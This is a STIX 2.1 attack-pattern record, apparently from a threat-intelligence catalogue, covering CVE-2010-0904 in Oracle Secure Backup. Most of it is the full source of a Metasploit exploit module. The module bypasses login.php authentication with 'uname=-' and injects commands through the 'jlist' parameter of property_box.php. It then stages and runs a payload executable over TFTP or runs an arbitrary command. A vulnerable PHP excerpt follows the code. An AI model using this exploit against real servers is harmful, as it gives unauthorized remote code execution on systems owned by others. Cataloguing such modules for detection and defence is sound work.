{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f980905a-a124-4248-8817-ddddf192ba2f",
    "created": "2024-08-14T16:54:26.269092Z",
    "modified": "2024-08-14T16:54:26.269096Z",
    "name": "Oracle Secure Backup Authentication Bypass/Command Injection Vulnerability",
    "description": " This module exploits an authentication bypass vulnerability in login.php. In conjunction with the authentication bypass issue the 'jlist' parameter in property_box.php can be used to execute arbitrary system commands. This module was tested against Oracle Secure Backup version 10.3.0.1.0 ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/osb_uname_jlist.rb",
            "external_id": "osb_uname_jlist.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0904"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle Secure Backup Authentication Bypass/Command Injection Vulnerability',\n      'Description'    => %q{\n          This module exploits an authentication bypass vulnerability\n        in login.php. In conjunction with the authentication bypass issue,\n        the 'jlist' parameter in property_box.php can be used to execute\n        arbitrary system commands.\n        This module was tested against Oracle Secure Backup version 10.3.0.1.0\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-0904' ],\n          [ 'OSVDB', '66338' ],\n          [ 'ZDI', '10-118' ]\n          # the jlist vector has not been disclosed or has it?\n        ],\n      'Targets'\t=>\n        [\n          [ 'Windows Universal',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win'\n            }\n          ]\n        ],\n      'CmdStagerFlavor' => 'tftp',\n      'Privileged' => true,\n      'Platform' => 'win',\n      'DisclosureDate' => '2010-07-13',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptBool.new('SSL',   [true, 'Use SSL', true]),\n        OptString.new('CMD', [ false, 'Execute this command instead of using command stager', \"\" ])\n      ])\n  end\n\n  def windows_stager\n    print_status(\"Sending request to #{datastore['RHOST']}:#{datastore['RPORT']}\")\n    tftphost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']\n    execute_cmdstager({ temp: '.', tftphost: tftphost })\n    @payload_exe = generate_payload_exe\n\n    print_status(\"Attempting to execute the payload...\")\n    execute_command(@payload_exe)\n  end\n\n  def execute_command(cmd, opts = {})\n\n    res = send_request_cgi(\n      {\n        'uri'   =>  '/login.php',\n        'data'  =>  'attempt=1&uname=-',\n        'method' => 'POST',\n      }, 5)\n\n    if res.get_cookies.match(/PHPSESSID=(.*);(.*)/i)\n      sessionid = res.get_cookies\n\n      data = '?type=Job&jlist=0%26' + Rex::Text::uri_encode(cmd)\n\n      send_request_raw(\n        {\n          'uri'   => '/property_box.php' + data,\n          'cookie' => sessionid,\n          'method' => 'GET',\n        }, 5)\n\n    else\n      print_error(\"Invalid PHPSESSION token..\")\n      return\n    end\n  end\n\n  def exploit\n\n    unless datastore['CMD'].blank?\n      print_status(\"Executing command '#{datastore['CMD']}'\")\n      execute_command(datastore['CMD'])\n      return\n    end\n\n    case target['Platform']\n      when 'win'\n        windows_stager\n      else\n        fail_with(Failure::Unknown, 'Target not supported.')\n    end\n\n    handler\n\n  end\nend\n\n__END__\n  else if (strcmp($type, \"Job\") == 0)\n    {\n    if (!is_array($objectname))\n      $objectname = array();\n    reset($objectname);\n    while (list(,$oname) = each($objectname))\n      {\n      $oname = escapeshellarg($oname);\n      $jlist = \"$jlist $oname\";\n      }\n    if (strlen($jlist) > 0)\n      $msg = exec_qr(\"$rbtool lsjob -lrRLC $jlist\");\n",
    "x_mitre_disclosure_date": "2010-07-13",
    "x_mitre_platforms": [
        "win'"
    ]
}